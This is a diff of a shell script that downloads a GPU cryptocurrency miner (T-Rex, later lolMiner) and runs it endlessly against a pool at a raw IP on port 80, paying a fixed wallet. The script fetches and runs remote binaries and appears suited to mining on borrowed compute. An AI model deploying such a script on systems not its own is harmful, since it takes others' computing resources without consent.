@@ -1,6 +1,10 @@
-sudo apt install screen -y
-apt install git -y
-wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz && tar -zxvf t-rex-0.21.6-linux.tar.gz && ./t-rex -a AUTOLYKOS2 -o 144.217.82.15:80 -u 3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$(echo $(shuf -i 1-9999 -n 1)-Trex) -p x --no-nvml
-sleep 3
+#!/bin/sh
+sudo apt-get install screen -y
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz &&
+tar -xf lolMiner_v1.29_Lin64.tar.gz &&
+while [ 1 ]; do
+cd 1.29/ &&
+./lolMiner --algo ETHASH --pool stratum+tcp://144.217.82.15:80 --user 3QsSYE159SB7FFj3dP9hCwhudsBsUrdSuJ.LOL-Ethash-Pejuang_Receh-$(echo $(shuf -i 1-99 -n 1)) --ethstratum ETHPROXY
+sleep 2
 done
-sleep 12345
+sleep 99999
